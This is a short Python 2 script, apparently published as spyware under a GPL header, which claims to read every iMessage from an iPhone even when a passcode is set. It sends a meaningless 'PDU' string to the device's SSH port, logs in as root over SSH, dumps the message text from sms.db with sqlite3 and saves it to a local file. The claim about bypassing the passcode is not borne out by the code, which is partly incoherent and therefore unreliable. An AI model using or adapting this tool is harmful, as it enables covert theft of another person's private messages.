'''
This program spy all messages from the iMessage app from your iPhone. Work on iDevices with passcode also.
Copyright (C) 2013 Louis Kremer aka. 3x7R00Tripper

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA. 
'''

#!/usr/bin/python
import socket
import time
import os
import random
import sys

spyip = "192.168.178.28" #The ip adress from your iDevice

def send_pdu_ad(linead, ip):
        leng = (len(linead) / 2) - 8
        buffer = "\n+CMT: ,%d\n%s\n" % (leng, linead)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, 22))
        sock.send(buffer)
        sock.close()

def acht_bit_encoder(string):
        retad = ''
        strlenad = len(string)
        for i in range(0,strlenad):
                tempad = "%02x" % ord(string[i])
                retad += tempad.upper()
        return retad

def create_pdu(n):
	tnad = str(n)
	retad = '0000'
	retad += acht_bit_encoder(tnad)
	return retad

def service_check(randnum, ip):
	pduad = create_pdu(randnum)
	send_pdu_ad(pduad, ip)
	time.sleep(1) 
	command = 'ssh root@'+ip+' "sqlite3 -line /private/var/mobile/Library/SMS/sms.db \'select text from message;\'"'
        cad = os.popen(command)
        last_msg_ad = cad.read()
	return last_msg_ad

if __name__ == '__main__':
        messages = service_check(22, spyip)
        print messages

f = open("messages.txt", "a")
f.write('')
f.write(messages)
f.close()
